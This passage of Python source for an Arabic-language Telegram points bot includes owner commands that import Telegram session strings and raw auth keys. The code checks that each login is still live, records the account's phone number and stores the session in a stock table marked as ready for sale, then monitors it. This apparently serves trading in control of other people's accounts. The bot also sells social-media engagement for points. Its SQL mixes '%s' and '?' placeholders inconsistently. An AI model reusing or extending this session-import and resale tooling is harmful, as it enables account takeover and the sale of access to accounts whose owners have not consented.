    pts = db_user["points"] if db_user else 0
    welcome = get_setting("welcome_message") or "أهلاً بك!"
    text = f"✅ *تم التحقق بنجاح!*\n\n{welcome}\n\n💰 رصيدك: {pts} نقطة{referral_note}"
    kb = main_menu_kb(is_own)
    if edit and update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)


async def start_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """يبدأ تدفّق المستخدم الجديد/غير المتحقق: بوابة الاشتراك الإجباري أولاً، ثم التحقق."""
    user = update.effective_user
    unjoined = await get_unjoined_mandatory_channels(context, user.id)
    is_owner = (user.id == OWNER_ID)
    if unjoined:
        context.user_data["state"] = "await_mandatory_join"
        await show_mandatory_gate(update, context, unjoined, edit=False, is_owner=is_owner)
        return
    await proceed_after_mandatory(update, context, edit=False)


# ────────────────────────────────────────────────────────────
#  /start
# ────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args
    invited_by = int(args[0]) if args and args[0].isdigit() else 0

    db_user = get_or_create_user(user.id, user.username or "", user.full_name or "", invited_by)
    is_own = (user.id == OWNER_ID)

    # ── وضع الصيانة: يُحجب كل شيء عن غير المالك، حتى يستطيع المالك دائماً الوصول للوحته لإلغائها ──
    if is_maintenance_on() and not is_own:
        await update.message.reply_text(MAINTENANCE_MESSAGE, parse_mode=ParseMode.MARKDOWN)
        return

    # مستخدم متحقق مسبقاً → تحقق من قنوات إجبارية جديدة أولاً (الاشتراك الإجباري مقدس)
    if db_user.get("verified", 0):
        unjoined = await get_unjoined_mandatory_channels(context, user.id)
        if unjoined:
            context.user_data["state"] = "await_mandatory_join"
            await show_mandatory_gate(update, context, unjoined, edit=False, is_owner=is_own)
            return
        # عَدّ المستخدم في التمويلات الجديدة التي لم يُحسب فيها بعد
        await count_user_for_fundings(user.id, context)
        context.user_data["state"] = "main_menu"
        db_user = get_user(user.id)
        pts = db_user["points"] if db_user else 0
        welcome = get_setting("welcome_message") or "أهلاً بك!"
        await update.message.reply_text(
            f"👋 *أهلاً بك مجدداً!*\n\n{welcome}\n\n💰 رصيدك: {pts} نقطة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu_kb(is_own)
        )
        return

    # مستخدم جديد أو لم يُكمل التحقق بعد: تحية ثم بدء تدفّق الاشتراك الإجباري + التحقق
    await update.message.reply_text(
        "👋 *أهلاً بك!*", parse_mode=ParseMode.MARKDOWN
    )
    await start_onboarding(update, context)

# ────────────────────────────────────────────────────────────
#  /admin — لوحة المالك المباشرة
# ────────────────────────────────────────────────────────────
async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return
    await update.message.reply_text(
        "⚙️ *لوحة المالك:*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=owner_settings_kb()
    )

async def cmd_import_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المالك: /import_session <session_string> — يستورد جلسة قديمة ويضيف رقمها للمخزون."""
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return
    if not context.args:
        await update.message.reply_text(
            "الاستخدام:\n`/import_session SESSION_STRING`\n\nالصق رمز الجلسة بعد الأمر.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    session_str = context.args[0].strip()
    # دعم صيغة Pyrogram JSON (dc_id + auth_key) مباشرةً في الأمر
    session_str = _maybe_convert_session(session_str)
    msg = await update.message.reply_text("⏳ جاري التحقق من الجلسة...")
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        await msg.edit_text("❌ متغيرات TELEGRAM_API_ID أو TELEGRAM_API_HASH غير مضبوطة.")
        return
    try:
        client = TelegramClient(StringSession(session_str), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            await msg.edit_text("❌ الجلسة منتهية الصلاحية أو غير صالحة. لا يمكن الاستيراد.")
            return
        me = await client.get_me()
        phone = me.phone if me.phone.startswith("+") else f"+{me.phone}"
        await client.disconnect()
        # أضف أو حدّث الرقم في المخزون
        with db_conn() as c:
            existing = c.execute(
                "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
            ).fetchone()
            if existing:
                c.execute(
                    "UPDATE number_stock SET session_string=%s, assigned_to=NULL, assigned_at=NULL WHERE phone_number=%s",
                    (session_str, phone)
                )
                action = "تم تحديث"
            else:
                c.execute(
                    "INSERT INTO number_stock (phone_number, session_string) VALUES (%s, %s)",
                    (phone, session_str)
                )
                action = "تمت إضافة"
        await msg.edit_text(
            f"✅ *{action} الرقم بنجاح!*\n\n📱 الرقم: `{phone}`\n\n"
            "الرقم الآن موجود في المخزون وجاهز للبيع أو الاستخدام.",
            parse_mode=ParseMode.MARKDOWN
        )
        # ابدأ مراقبة الرقم فوراً
        asyncio.create_task(_start_number_monitor(phone, session_str, context.application))
    except Exception as e:
        await msg.edit_text(f"❌ خطأ أثناء الاستيراد:\n`{e}`", parse_mode=ParseMode.MARKDOWN)

async def cmd_import_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المالك: /import_sessions — استيراد جماعي للجلسات عبر JSON."""
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return
    _pending_bulk_import.add(user.id)
    context.user_data["state"] = "os_bulk_import"
    await update.message.reply_text(
        "📥 *استيراد جماعي للحسابات*\n\n"
        "أرسل JSON بالصيغة التالية:\n\n"
        "```\n"
        '["SESSION1", "SESSION2", "SESSION3"]\n'
        "```\n\n"
        "أو مع أرقام (اختياري):\n\n"
        "```\n"
        '[{"session": "SESSION1", "phone": "+212xxxxxxx"},\n'
        ' {"session": "SESSION2"}]\n'
        "```",
        parse_mode=ParseMode.MARKDOWN
    )

async def cmd_import_hex(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المالك: /import_hex — استيراد جلسات بصيغة hex_auth_key:dc_id (سطر لكل حساب)."""
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return
    context.user_data["state"] = "os_import_hex"
    await update.message.reply_text(
        "📥 *استيراد حسابات بصيغة hex:dc*\n\n"
        "الصيغة المتوقعة — سطر واحد لكل حساب:\n"
        "`<auth_key_hex>:<dc_id>`\n\n"
        "مثال:\n"
        "`12f6766c...3f04b:5`\n\n"
        "الـ dc\\_id يكون 1-5 (الرقم بعد النقطتين).\n"
        "أرسل النص الآن (أو /cancel للإلغاء).",
        parse_mode=ParseMode.MARKDOWN
    )


async def cmd_addpoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المالك: /addpoints <user_id> <points> — يضيف (أو يخصم برقم سالب) نقاطاً لمستخدم معيّن."""
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return

    args = context.args
    if len(args) != 2:
        await update.message.reply_text("الاستخدام:\n/addpoints <user_id> <points>")
        return

    try:
        target_id = int(args[0])
        pts = int(args[1])
    except ValueError:
        await update.message.reply_text("⚠️ تأكد أن المعرف والنقاط أرقام صحيحة.")
        return

    target = get_user(target_id)
    if not target:
        await update.message.reply_text("⚠️ لا يوجد مستخدم بهذا المعرف في قاعدة البيانات.")
        return

    if pts == 0:
        await update.message.reply_text("⚠️ عدد النقاط لا يمكن أن يكون صفراً.")
        return

    if pts > 0:
        add_points(target_id, pts)
        actual = pts
    else:
        actual = -deduct_points_clamped(target_id, -pts)

    await update.message.reply_text(f"✅ تم تعديل رصيد المستخدم {target_id} بمقدار {actual} نقطة.")

    try:
        if actual > 0:
            await context.bot.send_message(target_id, f"💰 تم إضافة {actual} نقطة إلى رصيدك من قبل الإدارة.")
        elif actual < 0:
            await context.bot.send_message(target_id, f"⚠️ تم خصم {-actual} نقطة من رصيدك من قبل الإدارة.")
    except Exception:
        pass

# ────────────────────────────────────────────────────────────
#  /grant_ref — منح نقاط إحالة ضائعة يدوياً (للمالك فقط)
# ────────────────────────────────────────────────────────────
async def cmd_grant_ref(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المالك: /grant_ref <invited_user_id>
    يمنح نقاط الإحالة للداعي في حال كانت ضائعة (referral_credited=1 لكن النقاط لم تُمنح فعلاً).
    يستخدم لتصحيح حالات سببها مايغريشن قديم وضع referral_credited=1 بدون منح نقاط.
    """
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return

    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text(
            "📋 *الاستخدام:*\n`/grant_ref <user_id_المدعو>`\n\n"
            "يمنح نقاط الإحالة للداعي إن كانت لم تُمنح سابقاً.\n\n"
            "💡 *للعثور على الإحالات الضائعة:*\n"
            "ابحث عن مستخدمين عندهم `invited_by != 0` وتم تسجيلهم قبل تفعيل نظام النقاط.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    invited_user_id = int(args[0])

    with db_conn() as c:
        row = c.execute(
            "SELECT user_id, invited_by, referral_credited, full_name, username FROM users WHERE user_id=?",
            (invited_user_id,)
        ).fetchone()

    if not row:
        await update.message.reply_text(f"⚠️ لا يوجد مستخدم بالمعرف {invited_user_id} في قاعدة البيانات.")
        return

    invited_by = row["invited_by"]
    if not invited_by or invited_by == 0:
        await update.message.reply_text(f"⚠️ المستخدم {invited_user_id} لم يدخل عبر رابط دعوة (invited_by=0).")
        return

    inviter = get_user(invited_by)
    if not inviter:
        await update.message.reply_text(f"⚠️ الداعي (ID: {invited_by}) غير موجود في قاعدة البيانات.")
        return

    rp = int(get_setting("referral_points") or "30")

    # منح النقاط للداعي وتسجيل credited_at إن لم تكن مسجّلة
    with db_conn() as c:
        c.execute("UPDATE users SET points=points+%s WHERE user_id=%s", (rp, invited_by))
        # تأكد أن referral_credited=1 وcredited_at مضبوطة
        c.execute(
            "UPDATE users SET referral_credited=1, credited_at=COALESCE(credited_at, NOW()) WHERE user_id=%s",
            (invited_user_id,)
        )

    invited_name = row.get("username") or row.get("full_name") or str(invited_user_id)
    inviter_name = inviter.get("username") or inviter.get("full_name") or str(invited_by)

    await update.message.reply_text(
        f"✅ *تم منح نقاط الإحالة الضائعة*\n\n"
        f"👤 المدعو: @{invited_name} (`{invited_user_id}`)\n"
        f"🎁 الداعي: @{inviter_name} (`{invited_by}`) ← حصل على {rp} نقطة\n"
        f"💰 رصيد الداعي الآن: {inviter['points'] + rp} نقطة",
        parse_mode=ParseMode.MARKDOWN
    )

    # إشعار الداعي
    try:
        await context.bot.send_message(
            chat_id=invited_by,
            text=f"🎉 تم تصحيح إحالة ضائعة! حصلت على {rp} نقطة بسبب دعوة المستخدم {invited_name}."
        )
    except Exception:
        pass


# ────────────────────────────────────────────────────────────
#  معالج الرسائل النصية (آلة الحالة)
# ────────────────────────────────────────────────────────────
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user   = update.effective_user
    # نأخذ النص أو الوصف (caption) إن وُجد — بعض المستخدمين يرسلون قناتهم كصورة/منشور معه
    # وصف نصي بدل كتابة اليوزرنيم مباشرة، فلا يجب أن يبقى البوت صامتاً في هذه الحالة.
    text   = (update.message.text or update.message.caption or "").strip()
    state  = context.user_data.get("state", "")
    is_own = (user.id == OWNER_ID)

    # ── فحص الحظر: العضو المحظور لا يستطيع استخدام البوت (المالك مستثنى دائماً) ──
    if not is_own and is_user_banned(user.id):
        await update.message.reply_text("🚫 تم حظرك من استخدام هذا البوت.")
        return

    # ── وضع الصيانة: يُحجب كل شيء عن غير المالك، حتى يستطيع المالك دائماً الوصول للوحته لإلغائها ──
    if is_maintenance_on() and not is_own:
        await update.message.reply_text(MAINTENANCE_MESSAGE, parse_mode=ParseMode.MARKDOWN)
        return

    # ── فرض الاشتراك الإجباري على جميع المستخدمين المتحققين عبر الرسائل، بمن فيهم المالك ──
    # (استثناء وحيد: المالك أثناء استخدامه فعلياً لخطوات لوحة التحكم os_/confirm_*_order،
    # حتى لا يُحبَس خارج اللوحة التي يحتاجها لإدارة/إصلاح القنوات الإجبارية نفسها)
    _owner_admin_state = is_own and (
        state.startswith("os_") or state.startswith("await_mb_")
        or state in ("confirm_cancel_order", "confirm_complete_order")
    )
    if state != "verify_math" and not _owner_admin_state:
        try:
            _db_user = get_user(user.id)
            if _db_user and _db_user.get("verified", 0):
                _unjoined = await get_unjoined_mandatory_channels(context, user.id)
                if _unjoined:
                    context.user_data["state"] = "await_mandatory_join"
                    await show_mandatory_gate(update, context, _unjoined, edit=False, is_owner=is_own)
                    return
        except Exception as _gate_err:
            logger.warning(f"⚠️ خطأ في فحص القنوات الإجبارية للمستخدم {user.id}: {_gate_err}")
            # نتابع التنفيذ الطبيعي حتى لا يصمت البوت

    # ── استيراد حسابات بصيغة hex_auth_key:dc_id ──
    if state == "os_import_hex" and is_own:
        context.user_data["state"] = ""
        raw_lines = [l.strip() for l in text.splitlines() if l.strip()]
        sessions = []
        bad_lines = []
        for ln in raw_lines:
            # الصيغة: <hex>:<dc_id>  — نقسم عند آخر نقطتين فقط
            if ":" not in ln:
                bad_lines.append(ln[:30])
                continue
            hex_part, dc_part = ln.rsplit(":", 1)
            try:
                dc_id = int(dc_part)
                if dc_id not in (1, 2, 3, 4, 5):
                    raise ValueError("dc_id خارج النطاق")
                converted = pyrogram_json_to_telethon({"dc_id": dc_id, "auth_key": hex_part})
                if not converted:
                    raise ValueError("auth_key غير صالح (يجب 256 بايت = 512 حرف hex)")
                sessions.append(converted)
            except Exception as _e:
                bad_lines.append(f"{ln[:30]}… ({_e})")
        if not sessions:
            await update.message.reply_text(
                f"❌ لم أجد أي جلسة صالحة في النص.\n"
                + (f"الأخطاء:\n" + "\n".join(f"• {b}" for b in bad_lines[:10]) if bad_lines else ""),
                parse_mode=ParseMode.MARKDOWN
            )
            return
        warn = f"\n⚠️ {len(bad_lines)} سطر مرفوض." if bad_lines else ""
        prog = await update.message.reply_text(
            f"⏳ جاري استيراد {len(sessions)} حساب...{warn}"
        )
        ok_list, fail_list = [], []
        for idx, sess in enumerate(sessions):
            try:
                client = TelegramClient(StringSession(sess), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
                try:
                    await asyncio.wait_for(client.connect(), timeout=15)
                except asyncio.TimeoutError:
                    fail_list.append(f"#{idx+1}: انتهت مهلة الاتصال")
                    continue
                if not await asyncio.wait_for(client.is_user_authorized(), timeout=8):
                    await client.disconnect()
                    fail_list.append(f"#{idx+1}: جلسة منتهية أو غير مفعّلة")
                    continue
                me = await client.get_me()
                phone = me.phone if me.phone.startswith("+") else f"+{me.phone}"
                await client.disconnect()
                with db_conn() as _c:
                    exists = _c.execute(
                        "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
                    ).fetchone()
                    if exists:
                        _c.execute(
                            "UPDATE number_stock SET session_string=%s, assigned_to=NULL, assigned_at=NULL "
                            "WHERE phone_number=%s",
                            (sess, phone)
                        )
                    else:
                        _c.execute(
                            "INSERT INTO number_stock (phone_number, session_string) VALUES (%s,%s)",
                            (phone, sess)
                        )
                asyncio.create_task(_start_number_monitor(phone, sess, context.application))
                ok_list.append(phone)
                # تحديث دوري كل 10 حسابات
                if len(ok_list) % 10 == 0:
                    await prog.edit_text(
                        f"⏳ تم {len(ok_list)}/{len(sessions)}...", parse_mode=ParseMode.MARKDOWN
                    )
            except Exception as _be:
                fail_list.append(f"#{idx+1}: {_be}")
        result_lines = [f"✅ *تم استيراد {len(ok_list)} حساب بنجاح:*"]
        for p in ok_list:
            result_lines.append(f"  • `{p}`")
        if fail_list:
            result_lines.append(f"\n❌ *فشل {len(fail_list)}:*")
            for f_ in fail_list[:20]:
                result_lines.append(f"  • {f_}")
            if len(fail_list) > 20:
                result_lines.append(f"  _(+{len(fail_list)-20} أخرى)_")
        await prog.edit_text("\n".join(result_lines), parse_mode=ParseMode.MARKDOWN)
        return

    # ── استيراد جماعي للجلسات (JSON) ──
    if state == "os_bulk_import" and is_own:
        _pending_bulk_import.discard(user.id)
        context.user_data["state"] = ""
        import json as _json
        try:
            raw = _json.loads(text)
        except Exception:
            await update.message.reply_text("❌ الصيغة غير صحيحة. تأكد أنه JSON صالح وأعد المحاولة.\nأرسل /import_sessions للمحاولة مجدداً.")
            return
        # نقبل: list of strings أو list of dicts {"session":..., "phone":...}
        # أو dict واحد بصيغة Pyrogram JSON (dc_id + auth_key)
        if isinstance(raw, dict):
            raw = [raw]
        elif isinstance(raw, str):
            raw = [raw]
        sessions = []
        for item in raw:
            if isinstance(item, str):
                sessions.append({"session": _maybe_convert_session(item), "phone": None})
            elif isinstance(item, dict):
                # صيغة Pyrogram JSON: dc_id + auth_key
                if "dc_id" in item and "auth_key" in item:
                    converted = pyrogram_json_to_telethon(item)
                    if converted:
                        p = item.get("phone") or item.get("phone_number") or None
                        sessions.append({"session": converted, "phone": p})
                    continue
                s = (item.get("session") or item.get("session_string") or "").strip()
                p = item.get("phone") or item.get("phone_number") or None
                if s:
                    sessions.append({"session": _maybe_convert_session(s), "phone": p})
        if not sessions:
            await update.message.reply_text("❌ لم أجد أي جلسة في البيانات المرسلة.")
            return
        prog = await update.message.reply_text(f"⏳ جاري معالجة {len(sessions)} جلسة...")
        ok_list, fail_list = [], []
        for idx, entry in enumerate(sessions):
            sess = entry["session"]
            hint_phone = entry["phone"]
            try:
                if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
                    fail_list.append(hint_phone or f"#{idx+1}: لا توجد API credentials")
                    continue
                client = TelegramClient(StringSession(sess), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
                await client.connect()
                if not await client.is_user_authorized():
                    await client.disconnect()
                    fail_list.append(hint_phone or f"#{idx+1}: جلسة منتهية")
                    continue
                me = await client.get_me()
                phone = me.phone if me.phone.startswith("+") else f"+{me.phone}"
                await client.disconnect()
                with db_conn() as _c:
                    existing = _c.execute("SELECT id FROM number_stock WHERE phone_number=%s", (phone,)).fetchone()
                    if existing:
                        _c.execute(
                            "UPDATE number_stock SET session_string=%s, assigned_to=NULL, assigned_at=NULL WHERE phone_number=%s",
                            (sess, phone)
                        )
                    else:
                        _c.execute(
                            "INSERT INTO number_stock (phone_number, session_string) VALUES (%s, %s)",
                            (phone, sess)
                        )
                asyncio.create_task(_start_number_monitor(phone, sess, context.application))
                ok_list.append(phone)
            except Exception as _be:
                fail_list.append(hint_phone or f"#{idx+1}: {_be}")
        result_lines = [f"✅ *تم استيراد {len(ok_list)} حساب بنجاح:*"]
        for p in ok_list:
            result_lines.append(f"  • `{p}`")
        if fail_list:
            result_lines.append(f"\n❌ *فشل {len(fail_list)}:*")
            for f_ in fail_list:
                result_lines.append(f"  • {f_}")
        await prog.edit_text("\n".join(result_lines), parse_mode=ParseMode.MARKDOWN)
        return

    # ── التحقق الرياضي ──
    if state == "verify_math":
        correct = context.user_data.get("math_ans")
        try:
            ans = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً فقط.")
            return
        if ans == correct:
            await finalize_verification(update, context, user, edit=False)
        else:
            prob, new_ans = generate_math()
            context.user_data["math_ans"] = new_ans
            await update.message.reply_text(
                f"❌ إجابة خاطئة! حاول مجدداً:\n\n❓  *{prob} = ؟*",
                parse_mode=ParseMode.MARKDOWN
            )
        return

    # ── إدارة الأزرار: استلام اسم الزر الجديد ──
    if state == "await_mb_label" and is_own:
        menu = context.user_data.get("mb_menu")
        mb_type = context.user_data.get("mb_type")
        if not (menu and mb_type):
            context.user_data["state"] = "main_menu"
            await update.message.reply_text("⚠️ انتهت الجلسة، ابدأ من جديد.", reply_markup=owner_settings_kb())
            return
        context.user_data["mb_label"] = text
        if mb_type == "url":
            context.user_data["state"] = "await_mb_url"
            await update.message.reply_text("🔗 أرسل الرابط (يبدأ بـ https://):")
        elif mb_type == "text":
            context.user_data["state"] = "await_mb_textcontent"
            await update.message.reply_text("💬 أرسل النص الذي سيظهر للمستخدم عند الضغط على الزر:")
        elif mb_type == "owner":
            saved_contact = get_setting("owner_contact") or ""
            if saved_contact:
                with db_conn() as c:
                    max_order = c.execute("SELECT COALESCE(MAX(sort_order),-1) AS m FROM menu_items WHERE menu=?", (menu,)).fetchone()["m"]
                    c.execute(
                        "INSERT INTO menu_items (menu,label,action_type,action_value,width,sort_order,enabled) VALUES (?,?,?,?,?,?,1)",
                        (menu, text, "url", saved_contact, 2, max_order + 1)
                    )
                context.user_data["state"] = "main_menu"
                await update.message.reply_text(
                    f"✅ تمت إضافة الزر '{text}' (يفتح: {saved_contact}).",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للإدارة", callback_data=f"mb_menu:{menu}")]])
                )
            else:
                context.user_data["state"] = "await_mb_url"
                context.user_data["mb_save_as_owner_contact"] = True
                await update.message.reply_text(
                    "🔗 لم تحدد رابط تواصل مع المالك من قبل. أرسل الآن رابط حسابك الشخصي "
                    "(مثال: `https://t.me/username`) — سيُستخدم لهذا الزر وسيُحفظ لاستخدامه تلقائياً في المرات القادمة:",
                    parse_mode=ParseMode.MARKDOWN
                )
        else:  # goto
            rows = [[InlineKeyboardButton(lbl, callback_data=f"mb_goto_pick:{val}")] for lbl, val in GOTO_TARGETS]
            rows.append([InlineKeyboardButton("🔙 رجوع", callback_data=f"mb_menu:{menu}")])
            context.user_data["state"] = "main_menu"
            await update.message.reply_text("↪️ اختر القسم الذي تريد ربط الزر به:", reply_markup=InlineKeyboardMarkup(rows))
        return

    if state == "await_mb_url" and is_own:
        if not (text.startswith("http://") or text.startswith("https://")):
            await update.message.reply_text("⚠️ الرابط يجب أن يبدأ بـ http:// أو https://")
            return
        menu  = context.user_data.get("mb_menu")
        label = context.user_data.get("mb_label")
        save_as_owner_contact = context.user_data.pop("mb_save_as_owner_contact", False)
        with db_conn() as c:
            max_order = c.execute("SELECT COALESCE(MAX(sort_order),-1) AS m FROM menu_items WHERE menu=?", (menu,)).fetchone()["m"]
            c.execute(
                "INSERT INTO menu_items (menu,label,action_type,action_value,width,sort_order,enabled) VALUES (?,?,?,?,?,?,1)",
                (menu, label, "url", text, 2, max_order + 1)
            )
        if save_as_owner_contact:
            set_setting("owner_contact", text)
        context.user_data["state"] = "main_menu"
        await update.message.reply_text(f"✅ تمت إضافة الزر '{label}'.",
                                         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للإدارة", callback_data=f"mb_menu:{menu}")]]))
        return

    if state == "await_mb_textcontent" and is_own:
        menu  = context.user_data.get("mb_menu")
        label = context.user_data.get("mb_label")
        with db_conn() as c:
            max_order = c.execute("SELECT COALESCE(MAX(sort_order),-1) AS m FROM menu_items WHERE menu=?", (menu,)).fetchone()["m"]
            c.execute(
                "INSERT INTO menu_items (menu,label,action_type,action_value,width,sort_order,enabled) VALUES (?,?,?,?,?,?,1)",
                (menu, label, "text", text, 2, max_order + 1)
            )
        context.user_data["state"] = "main_menu"
        await update.message.reply_text(f"✅ تمت إضافة الزر '{label}'.",
                                         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للإدارة", callback_data=f"mb_menu:{menu}")]]))
        return

    # ── مسار خدمة SMM: إدخال الرابط (بعد الكمية) ──
    if state == "await_smm_link":
        context.user_data["smm_link"] = text
        svc  = context.user_data.get("smm_svc", {})
        qty  = context.user_data.get("smm_qty", 0)
        cost = context.user_data.get("smm_cost", 0)
        db_user = get_user(user.id)
        pts = db_user["points"] if db_user else 0
        desc_text = svc.get("description") or ""
        context.user_data["state"] = "confirm_smm"
        await update.message.reply_text(
            f"📋 *تفاصيل الطلب:*\n\n"
            f"🔹 الخدمة: {svc.get('name_ar', '')}\n"
            f"🔢 الكمية: {qty}\n"
            f"🔗 الرابط: `{text}`\n"
            + (f"📝 {desc_text}\n" if desc_text else "") +
            f"💰 التكلفة: {cost} نقطة\n"
            f"💎 رصيدك: {pts} نقطة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ تأكيد الطلب", callback_data="confirm_order:yes"),
                 InlineKeyboardButton("❌ إلغاء", callback_data="confirm_order:no")],
                [InlineKeyboardButton("🔙 رجوع (تغيير الرابط)", callback_data="smm_back:link")]
            ])
        )
        return

    if state == "await_smm_qty":
        try:
            qty = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        svc = context.user_data.get("smm_svc", {})
        if not svc:
            svc_id = context.user_data.get("smm_svc_db_id")
            with db_conn() as c:
                svc = dict(c.execute("SELECT * FROM services WHERE id=?", (svc_id,)).fetchone() or {})
            context.user_data["smm_svc"] = svc
        if qty < svc.get("min_qty", 1) or qty > svc.get("max_qty", 1000000):
            await update.message.reply_text(
                f"⚠️ الكمية خارج النطاق المسموح.\nالحد الأدنى: {svc['min_qty']} | الحد الأعلى: {svc['max_qty']}"
            )
            return
        cost = int(qty / 1000 * svc.get("price_per_point", 1))
        context.user_data["smm_qty"] = qty
        context.user_data["smm_cost"] = cost
        context.user_data["state"] = "await_smm_link"
        await update.message.reply_text(
            f"✅ الكمية: {qty} | التكلفة: {cost} نقطة\n\n"
            f"📎 أرسل *رابط* الحساب/القناة/البوست:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع (تغيير الكمية)", callback_data="smm_back:qty")]
            ])
        )
        return

    if state == "confirm_smm":
        if text == "نعم":
            svc  = context.user_data.get("smm_svc", {})
            qty  = context.user_data.get("smm_qty", 0)
            cost = context.user_data.get("smm_cost", 0)
            link = context.user_data.get("smm_link", "")
            if not deduct_points(user.id, cost):
                await update.message.reply_text("❌ نقاطك غير كافية.")
                context.user_data["state"] = "main_menu"
                await update.message.reply_text("🏠 القائمة الرئيسية:", reply_markup=main_menu_kb(is_own))
                return
            api_res = smm_create_order(svc["api_service_id"], link, qty, panel=svc.get("panel", 1))
            if "error" in api_res or not api_res.get("order"):
                add_points(user.id, cost)
                err_msg = md_escape(api_res.get("error", "خطأ غير معروف من الموقع"))
                await update.message.reply_text(
                    f"❌ *فشل الطلب:* {err_msg}\n✅ تمت إعادة نقاطك.\n\n"
                    f"{LINK_ERROR_GUIDANCE}",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=main_menu_kb(is_own)
                )
                context.user_data["state"] = "main_menu"
                return
            api_oid = str(api_res.get("order", ""))
            code    = next_order_code(user.id)
            with db_conn() as c:
                c.execute(
                    "INSERT INTO orders (user_id,service_id,link,quantity,cost_points,api_order_id,order_code) VALUES (?,?,?,?,?,?,?)",
                    (user.id, svc["id"], link, qty, cost, api_oid, code)
                )
            await update.message.reply_text(
                f"✅ *تمت العملية بنجاح!*\n\n"
                f"🔹 الخدمة: {svc['name_ar']}\n"
                f"🔢 الكمية: {qty}\n"
                f"💰 التكلفة: {cost} نقطة",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )
            await update.message.reply_text(
                f"📌 *كود عمليتك هو:* `{code}`\nاحفظه قد تحتاجه لاحقاً.",
                parse_mode=ParseMode.MARKDOWN
            )
            await notify_group(
                context.application,
                f"🆕 <b>طلب جديد</b>\n"
                f"👤 المستخدم: <a href='tg://user?id={user.id}'>{user.full_name}</a>\n"
                f"🔹 الخدمة: {svc['name_ar']}\n"
                f"🔗 الرابط: {link}\n"
                f"🔢 الكمية: {qty}\n"
                f"💰 التكلفة: {cost} نقطة\n"
                f"📌 الكود: {code}"
            )
        elif text == "لا":
            await update.message.reply_text("❌ تم إلغاء الطلب.", reply_markup=main_menu_kb(is_own))
        context.user_data["state"] = "main_menu"
        return

    # ── مسار تحويل النقاط ──
    if state == "await_transfer_id":
        try:
            tid = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل ايدي رقمي صحيح.")
            return
        if tid == user.id:
            await update.message.reply_text("⚠️ لا يمكنك التحويل لنفسك.")
            return
        to_user = get_user(tid)
        if not to_user:
            await update.message.reply_text("⚠️ المستخدم غير موجود في البوت.")
            return
        context.user_data["transfer_to"] = tid
        context.user_data["transfer_to_name"] = to_user["full_name"]
        context.user_data["state"] = "await_transfer_pts"
        await update.message.reply_text(
            f"👤 المستلم: {to_user['full_name']}\n\nكم نقطة تريد تحويلها؟ (خصم 1%)"
        )
        return

    if state == "await_transfer_pts":
        try:
            pts = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        if pts <= 0:
            await update.message.reply_text("⚠️ أدخل كمية أكبر من صفر.")
            return
        fee  = max(1, int(pts * 0.01))
        total_deduct = pts + fee
        db_user = get_user(user.id)
        if db_user["points"] < total_deduct:
            await update.message.reply_text(f"❌ نقاطك غير كافية. تحتاج {total_deduct} نقطة (شاملة رسوم 1%).")
            return
        context.user_data["transfer_pts"]   = pts
        context.user_data["transfer_fee"]   = fee
        context.user_data["transfer_total"] = total_deduct
        context.user_data["state"] = "confirm_transfer"
        to_name = context.user_data.get("transfer_to_name", "")
        await update.message.reply_text(
            f"📋 *تأكيد التحويل:*\n\n"
            f"👤 إلى: {to_name}\n"
            f"💰 المبلغ: {pts} نقطة\n"
            f"💸 الرسوم: {fee} نقطة (1%)\n"
            f"📤 الإجمالي: {total_deduct} نقطة\n\n"
            f"أرسل *نعم* للتأكيد أو *لا* للإلغاء",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if state == "confirm_transfer":
        if text == "نعم":
